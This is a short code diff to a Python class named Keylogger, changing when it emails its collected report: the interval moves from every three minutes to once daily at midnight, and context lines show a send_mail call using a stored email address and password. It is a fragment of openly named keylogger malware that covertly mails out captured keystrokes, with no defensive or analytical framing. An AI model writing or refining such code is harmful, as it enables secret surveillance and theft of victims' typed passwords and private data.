@@ -45,7 +45,10 @@ class Keylogger:
         self.send_mail(self.email, self.password, msg)
         self.count = 0
 #        timer = Timer(interval=60*60*24, function=self.report)
-        timer = Timer(interval=60*3, function=self.report)
+        now = datetime.now()
+        seconds_left = (24 * 60 - (now.hour * 60 + now.minute)) * 60
+
+        timer = Timer(interval=seconds_left+1, function=self.report)
         timer.daemon = True
         timer.start()
 
